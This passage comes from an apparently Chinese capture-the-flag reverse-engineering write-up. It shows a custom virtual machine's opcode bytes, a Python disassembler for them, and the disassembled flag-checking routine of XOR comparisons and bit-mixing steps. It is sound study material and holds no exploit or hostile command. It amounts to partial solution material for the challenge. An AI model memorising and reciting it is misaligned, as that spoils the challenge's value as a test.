class="number">0x05</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x22</span>, <span class="number">0x77</span>, <span class="number">0x10</span>, <span class="number">0x80</span>, <span class="number">0x02</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x23</span>, <span class="number">0x80</span>, <span class="number">0x02</span>, <span class="number">0x23</span>, <span class="number">0x77</span>, <span class="number">0xF1</span>, <span class="number">0x98</span>, <span class="number">0x31</span>, <span class="number">0x77</span>, <span class="number">0x10</span>, <span class="number">0x80</span>, <span class="number">0x02</span>, <span class="number">0x18</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x23</span>, <span class="number">0x80</span>, <span class="number">0x02</span>, <span class="number">0x20</span>, <span class="number">0xB9</span>, <span class="number">0xE4</span>, <span class="number">0x35</span>, <span class="number">0x31</span>, <span class="number">0x77</span>, <span class="number">0x10</span>, <span class="number">0x80</span>, <span class="number">0x02</span>, <span class="number">0x12</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x22</span>, <span class="number">0x77</span>, <span class="number">0xA0</span>, <span class="number">0xC1</span>, <span class="number">0x24</span>, <span class="number">0x80</span>, <span class="number">0x02</span>, <span class="number">0x18</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x23</span>, <span class="number">0x10</span>, <span class="number">0xC1</span>, <span class="number">0x25</span>, <span class="number">0x80</span>, <span class="number">0x02</span>, <span class="number">0x10</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x23</span>, <span class="number">0xF7</span>, <span class="number">0xC1</span>, <span class="number">0x26</span>, <span class="number">0x80</span>, <span class="number">0x02</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x23</span>, <span class="number">0xF7</span>, <span class="number">0xC1</span>, <span class="number">0x27</span>, <span class="number">0xF7</span>, <span class="number">0xFE</span>, <span class="number">0x32</span>, <span class="number">0x20</span>, <span class="number">0x43</span>, <span class="number">0x33</span>, <span class="number">0x77</span>, <span class="number">0x80</span>, <span class="number">0x02</span>, <span class="number">0x11</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x22</span>, <span class="number">0x35</span>, <span class="number">0x37</span>, <span class="number">0x38</span>, <span class="number">0x77</span>, <span class="number">0x80</span>, <span class="number">0x02</span>, <span class="number">0x0D</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x23</span>, <span class="number">0x77</span>, <span class="number">0x38</span>, <span class="number">0x39</span>, <span class="number">0x10</span>, <span class="number">0x32</span>, <span class="number">0x20</span>, <span class="number">0x43</span>, <span class="number">0x33</span>, <span class="number">0x77</span>, <span class="number">0x80</span>, <span class="number">0x02</span>, <span class="number">0x11</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x22</span>, <span class="number">0x35</span>, <span class="number">0x37</span>, <span class="number">0x38</span>, <span class="number">0x77</span>, <span class="number">0x80</span>, <span class="number">0x02</span>, <span class="number">0x0D</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x23</span>, <span class="number">0x77</span>, <span class="number">0x38</span>, <span class="number">0x39</span>, <span class="number">0xC7</span>, <span class="number">0xC1</span>, <span class="number">0x28</span>, <span class="number">0x80</span>, <span class="number">0x02</span>, <span class="number">0x18</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x23</span>, <span class="number">0x10</span>, <span class="number">0xC1</span>, <span class="number">0x29</span>, <span class="number">0x80</span>, <span class="number">0x02</span>, <span class="number">0x10</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x23</span>, <span class="number">0xF7</span>, <span class="number">0xC1</span>, <span class="number">0x2A</span>, <span class="number">0x80</span>, <span class="number">0x02</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x23</span>, <span class="number">0xF7</span>, <span class="number">0xC1</span>, <span class="number">0x2B</span>, <span class="number">0xF7</span>, <span class="number">0xFE</span>, <span class="number">0x32</span>, <span class="number">0x20</span>, <span class="number">0x43</span>, <span class="number">0x33</span>, <span class="number">0x77</span>, <span class="number">0x80</span>, <span class="number">0x02</span>, <span class="number">0x11</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x22</span>, <span class="number">0x35</span>, <span class="number">0x37</span>, <span class="number">0x38</span>, <span class="number">0x77</span>, <span class="number">0x80</span>, <span class="number">0x02</span>, <span class="number">0x0D</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x23</span>, <span class="number">0x77</span>, <span class="number">0x38</span>, <span class="number">0x39</span>, <span class="number">0x10</span>, <span class="number">0x32</span>, <span class="number">0x20</span>, <span class="number">0x43</span>, <span class="number">0x33</span>, <span class="number">0x77</span>, <span class="number">0x80</span>, <span class="number">0x02</span>, <span class="number">0x11</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x22</span>, <span class="number">0x35</span>, <span class="number">0x37</span>, <span class="number">0x38</span>, <span class="number">0x77</span>, <span class="number">0x80</span>, <span class="number">0x02</span>, <span class="number">0x0D</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x23</span>, <span class="number">0x77</span>, <span class="number">0x38</span>, <span class="number">0x39</span>, <span class="number">0xC8</span>, <span class="number">0x99</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">print_asm</span>(<span class="params">reg</span>):<span class="comment"># 这里写成python语法方便爆破</span></span><br><span class="line">    now = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        opcode = reg[now]</span><br><span class="line">        <span class="keyword">if</span> opcode == <span class="number">113</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;push <span class="subst">&#123;reg[now+<span class="number">1</span>]&#125;</span>,<span class="subst">&#123;reg[now+<span class="number">2</span>]&#125;</span>,<span class="subst">&#123;reg[now+<span class="number">3</span>]&#125;</span>,<span class="subst">&#123;reg[now+<span class="number">4</span>]&#125;</span>&quot;</span>)</span><br><span class="line">            now += <span class="number">5</span></span><br><span class="line">        <span class="keyword">elif</span> opcode == <span class="number">65</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;reg1+=reg2&quot;</span>)</span><br><span class="line">            now += <span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> opcode == <span class="number">66</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;reg1-=reg4&quot;</span>)</span><br><span class="line">            now += <span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> opcode == <span class="number">67</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;reg1*=reg3&quot;</span>)</span><br><span class="line">            now += <span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> opcode == <span class="number">55</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;reg1=reg5&quot;</span>)</span><br><span class="line">            now += <span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> opcode == <span class="number">56</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;reg1^=reg4&quot;</span>)</span><br><span class="line">            now += <span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> opcode == <span class="number">57</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;reg1^=reg5&quot;</span>)</span><br><span class="line">            now += <span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> opcode == <span class="number">53</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;reg5=reg1&quot;</span>)</span><br><span class="line">            now += <span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> opcode == <span class="number">0xF7</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;reg9+=reg1&quot;</span>)</span><br><span class="line">            now += <span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> opcode == <span class="number">68</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;reg1/=reg5&quot;</span>)</span><br><span class="line">            now += <span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> opcode == <span class="number">0x80</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;reg<span class="subst">&#123;reg[now+<span class="number">1</span>]&#125;</span>= <span class="subst">&#123;<span class="built_in">int</span>.from_bytes(<span class="built_in">bytes</span>(reg[now + <span class="number">2</span>:now + <span class="number">6</span>]), <span class="string">&#x27;little&#x27;</span>)&#125;</span>&quot;</span>)</span><br><span class="line">            now += <span class="number">6</span></span><br><span class="line">        <span class="keyword">elif</span> opcode == <span class="number">0x77</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;reg1^=reg9&quot;</span>)</span><br><span class="line">            now += <span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> opcode == <span class="number">0x53</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;pop [reg3]&quot;</span>)</span><br><span class="line">            now += <span class="number">2</span></span><br><span class="line">        <span class="keyword">elif</span> opcode == <span class="number">0x22</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;reg1&gt;&gt;=reg2&quot;</span>)</span><br><span class="line">            now += <span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> opcode == <span class="number">0x23</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;reg1&lt;&lt;=reg2&quot;</span>)</span><br><span class="line">            now += <span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> opcode == <span class="number">0x99</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">elif</span> opcode == <span class="number">0x76</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;r3 = [r6]&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[r6] = 0&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;r6 += 4&quot;</span>)</span><br><span class="line">            now += <span class="number">5</span></span><br><span class="line">        <span class="keyword">elif</span> opcode == <span class="number">0x54</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;read [reg3]&quot;</span>)</span><br><span class="line">            now += <span class="number">2</span></span><br><span class="line">        <span class="keyword">elif</span> opcode == <span class="number">0x30</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;reg1|=reg2&quot;</span>)</span><br><span class="line">            now += <span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> opcode == <span class="number">0x31</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;reg1&amp;=reg2&quot;</span>)</span><br><span class="line">            now += <span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> opcode == <span class="number">0x32</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;r3 = <span class="subst">&#123;reg[now+<span class="number">1</span>]&#125;</span>&quot;</span>)</span><br><span class="line">            now += <span class="number">2</span></span><br><span class="line">        <span class="keyword">elif</span> opcode == <span class="number">9</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;reg1=1877735783&quot;</span>)</span><br><span class="line">            now += <span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> opcode == <span class="number">0x10</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;reg9=reg1&quot;</span>)</span><br><span class="line">            now += <span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> opcode == <span class="number">0x33</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;reg4=reg1&quot;</span>)</span><br><span class="line">            now += <span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> opcode == <span class="number">0x34</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;reg2=<span class="subst">&#123;reg[now+<span class="number">1</span>]&#125;</span>&quot;</span>)</span><br><span class="line">            now += <span class="number">2</span></span><br><span class="line">        <span class="keyword">elif</span> opcode == <span class="number">0xFE</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;reg1=reg9&quot;</span>)</span><br><span class="line">            now += <span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> opcode == <span class="number">0x11</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;printf &#x27;%x\\n&#x27;, reg1&quot;</span>)</span><br><span class="line">            now += <span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> opcode == <span class="number">0xA0</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;cmp reg1=1877735783&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;jne exit&quot;</span>)</span><br><span class="line">            now += <span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> opcode == <span class="number">0xA1</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;read 0, s, 0x2Cu&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;cmp strlen(s), 44&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;jne exit&quot;</span>)</span><br><span class="line">            now += <span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> opcode == <span class="number">0xB1</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;reg9=<span class="subst">&#123;fog[<span class="number">0</span>]&#125;</span>&quot;</span>)</span><br><span class="line">            now += <span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> opcode == <span class="number">0xB2</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;reg9=<span class="subst">&#123;fog[<span class="number">1</span>]&#125;</span>&quot;</span>)</span><br><span class="line">            now += <span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> opcode == <span class="number">0xA4</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;fog[<span class="subst">&#123;now&#125;</span>]=reg1&quot;</span>)</span><br><span class="line">            now += <span class="number">4</span></span><br><span class="line">        <span class="keyword">elif</span> opcode == <span class="number">0xB3</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;reg9=fog[2]&quot;</span>)</span><br><span class="line">            now += <span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> opcode == <span class="number">0xB4</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;reg9=fog[3]&quot;</span>)</span><br><span class="line">            now += <span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> opcode == <span class="number">0xC1</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;reg1=s[<span class="subst">&#123;reg[now+<span class="number">1</span>]&#125;</span>]&quot;</span>)</span><br><span class="line">            now += <span class="number">2</span></span><br><span class="line">        <span class="keyword">elif</span> opcode == <span class="number">0xC7</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;cmp <span class="subst">&#123;exit_door[<span class="number">0</span>]&#125;</span>, reg1&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;jne exit&quot;</span>)</span><br><span class="line">            now += <span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> opcode == <span class="number">0xC8</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;cmp <span class="subst">&#123;exit_door[<span class="number">1</span>]&#125;</span>, reg1&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;jne exit&quot;</span>)</span><br><span class="line">            now += <span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> opcode == <span class="number">0xC2</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;exit if now!=r1&quot;</span>)</span><br><span class="line">            now += <span class="number">5</span></span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">print_asm(opcode)</span><br></pre></td></tr></table></figure><p>这个变量没有命好名。。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br></pre></td><td class="code"><pre><span class="line">read 0, s, 0x2Cu</span><br><span class="line">cmp strlen(s), 44</span><br><span class="line">jne exit</span><br><span class="line">reg1=s[0]</span><br><span class="line">reg9=123</span><br><span class="line">reg1^=reg9</span><br><span class="line">exit if 74!=r1</span><br><span class="line">reg1=s[1]</span><br><span class="line">reg9=47</span><br><span class="line">reg1^=reg9</span><br><span class="line">exit if 25!=r1</span><br><span class="line">reg1=s[2]</span><br><span class="line">reg9=fog[3]</span><br><span class="line">reg1^=reg9</span><br><span class="line">exit if 221!=r1</span><br><span class="line">reg1=s[3]</span><br><span class="line">reg9=fog[2]</span><br><span class="line">reg1^=reg9</span><br><span class="line">exit if 15!=r1</span><br><span class="line">reg1=s[4]</span><br><span class="line">reg9=47</span><br><span class="line">reg1^=reg9</span><br><span class="line">exit if 27!=r1</span><br><span class="line">reg1=s[5]</span><br><span class="line">reg9=fog[3]</span><br><span class="line">reg1^=reg9</span><br><span class="line">exit if 137!=r1</span><br><span class="line">reg1=s[6]</span><br><span class="line">reg9=123</span><br><span class="line">reg1^=reg9</span><br><span class="line">exit if 25!=r1</span><br><span class="line">reg1=s[7]</span><br><span class="line">reg9=fog[2]</span><br><span class="line">reg1^=reg9</span><br><span class="line">exit if 84!=r1</span><br><span class="line">reg1=s[8]</span><br><span class="line">reg9=123</span><br><span class="line">reg1^=reg9</span><br><span class="line">exit if 79!=r1</span><br><span class="line">reg1=s[9]</span><br><span class="line">reg9=123</span><br><span class="line">reg1^=reg9</span><br><span class="line">exit if 78!=r1</span><br><span class="line">reg1=s[10]</span><br><span class="line">reg9=fog[2]</span><br><span class="line">reg1^=reg9</span><br><span class="line">exit if 85!=r1</span><br><span class="line">reg1=s[11]</span><br><span class="line">reg9=fog[2]</span><br><span class="line">reg1^=reg9</span><br><span class="line">exit if 86!=r1</span><br><span class="line">reg1=s[12]</span><br><span class="line">reg9=fog[3]</span><br><span class="line">reg1^=reg9</span><br><span class="line">exit if 142!=r1</span><br><span class="line">reg1=s[13]</span><br><span class="line">reg9=47</span><br><span class="line">reg1^=reg9</span><br><span class="line">exit if 73!=r1</span><br><span class="line">reg1=s[14]</span><br><span class="line">reg9=fog[2]</span><br><span class="line">reg1^=reg9</span><br><span class="line">exit if 14!=r1</span><br><span class="line">reg1=s[15]</span><br><span class="line">reg9=123</span><br><span class="line">reg1^=reg9</span><br><span class="line">exit if 75!=r1</span><br><span class="line">reg1=s[16]</span><br><span class="line">reg9=fog[2]</span><br><span class="line">reg1^=reg9</span><br><span class="line">exit if 6!=r1</span><br><span class="line">reg1=s[17]</span><br><span class="line">reg9=fog[2]</span><br><span class="line">reg1^=reg9</span><br><span class="line">exit if 84!=r1</span><br><span class="line">reg1=s[18]</span><br><span class="line">reg9=47</span><br><span class="line">reg1^=reg9</span><br><span class="line">exit if 26!=r1</span><br><span class="line">reg1=s[19]</span><br><span class="line">reg9=123</span><br><span class="line">reg1^=reg9</span><br><span class="line">exit if 66!=r1</span><br><span class="line">reg1=s[20]</span><br><span class="line">reg9=fog[2]</span><br><span class="line">reg1^=reg9</span><br><span class="line">exit if 83!=r1</span><br><span class="line">reg1=s[21]</span><br><span class="line">reg9=123</span><br><span class="line">reg1^=reg9</span><br><span class="line">exit if 31!=r1</span><br><span class="line">reg1=s[22]</span><br><span class="line">reg9=fog[2]</span><br><span class="line">reg1^=reg9</span><br><span class="line">exit if 82!=r1</span><br><span class="line">reg1=s[23]</span><br><span class="line">reg9=fog[3]</span><br><span class="line">reg1^=reg9</span><br><span class="line">exit if 219!=r1</span><br><span class="line">reg1=s[24]</span><br><span class="line">reg9=123</span><br><span class="line">reg1^=reg9</span><br><span class="line">exit if 25!=r1</span><br><span class="line">reg1=s[25]</span><br><span class="line">reg9=fog[3]</span><br><span class="line">reg1^=reg9</span><br><span class="line">exit if 217!=r1</span><br><span class="line">reg1=s[26]</span><br><span class="line">reg9=123</span><br><span class="line">reg1^=reg9</span><br><span class="line">exit if 25!=r1</span><br><span class="line">reg1=s[27]</span><br><span class="line">reg9=fog[2]</span><br><span class="line">reg1^=reg9</span><br><span class="line">exit if 85!=r1</span><br><span class="line">reg1=s[28]</span><br><span class="line">reg9=47</span><br><span class="line">reg1^=reg9</span><br><span class="line">exit if 25!=r1</span><br><span class="line">reg1=s[29]</span><br><span class="line">reg9=fog[2]</span><br><span class="line">reg1^=reg9</span><br><span class="line">exit if 0!=r1</span><br><span class="line">reg1=s[30]</span><br><span class="line">reg9=123</span><br><span class="line">reg1^=reg9</span><br><span class="line">exit if 75!=r1</span><br><span class="line">reg1=s[31]</span><br><span class="line">reg9=47</span><br><span class="line">reg1^=reg9</span><br><span class="line">exit if 30!=r1</span><br><span class="line">reg1=s[32]</span><br><span class="line">reg2= 24</span><br><span class="line">reg1&lt;&lt;=reg2</span><br><span class="line">reg9=reg1</span><br><span class="line">reg1=s[33]</span><br><span class="line">reg2= 16</span><br><span class="line">reg1&lt;&lt;=reg2</span><br><span class="line">reg9+=reg1</span><br><span class="line">reg1=s[34]</span><br><span class="line">reg2= 8</span><br><span class="line">reg1&lt;&lt;=reg2</span><br><span class="line">reg9+=reg1</span><br><span class="line">reg1=s[35]</span><br><span class="line">reg9+=reg1</span><br><span class="line">reg1=reg9</span><br><span class="line">reg2= 5</span><br><span class="line">reg1&gt;&gt;=reg2</span><br><span class="line">reg1^=reg9</span><br><span class="line">reg9=reg1</span><br><span class="line">reg2= 7</span><br><span class="line">reg1&lt;&lt;=reg2</span><br><span class="line">reg2= 2565961507</span><br><span class="line">reg1&amp;=reg2</span><br><span class="line">reg1^=reg9</span><br><span class="line">reg9=reg1</span><br><span class="line">reg2= 24</span><br><span class="line">reg1&lt;&lt;=reg2</span><br><span class="line">reg2= 904182048</span><br><span class="line">reg1&amp;=reg2</span><br><span class="line">reg1^=reg9</span><br><span class="line">reg9=reg1</span><br><span class="line">reg2= 18</span><br><span class="line">reg1&gt;&gt;=reg2</span><br><span class="line">reg1^=reg9</span><br><span class="line">cmp reg1=1877735783</span><br><span class="line">jne exit</span><br><span class="line">reg1=s[36]</span><br><span class="line">reg2= 24</span><br><span class="line">reg1&lt;&lt;=reg2</span><br><span class="line">reg9=reg1</span><br><span class="line">reg1=s[37]</span><br><span class="line">reg2= 16</span><br><span class="line">reg1&lt;&lt;=reg2</span><br><span class="line">reg9+=reg1</span><br><span class="line">reg1=s[38]</span><br><span class="line">reg2= 8</span><br><span class="line">reg1&lt;&lt;=reg2</span><br><span class="line">reg9+=reg1</span><br><span class="line">reg1=s[39]</span><br><span class="line">reg9+=reg1</span><br><span class="line">reg1=reg9</span><br><span class="line">r3 = 32</span><br><span class="line">reg1*=reg3</span><br><span class="line">reg4=reg1</span><br><span class="line">reg1^=reg9</span><br><span class="line">reg2= 17</span><br><span class="line">reg1&gt;&gt;=reg2</span><br><span class="line">reg5=reg1</span><br><span class="line">reg1=reg5</span><br><span class="line">reg1^=reg4</span><br><span class="line">reg1^=reg9</span><br><span class="line">reg2= 13</span><br><span class="line">reg1&lt;&lt;=reg2</span><br><span class="line">reg1^=reg9</span><br><span class="line">reg1^=reg4</span><br><span class="line">reg1^=reg5</span><br><span class="line">reg9=reg1</span><br><span class="line">r3 = 32</span><br><span class="line">reg1*=reg3</span><br><span class="line">reg4=reg1</span><br><span class="line">reg1^=reg9</span><br><span class="line">reg2= 17</span><br><span class="line">reg1&gt;&gt;=reg2</span><br><span class="line">reg5=reg1</span><br><span 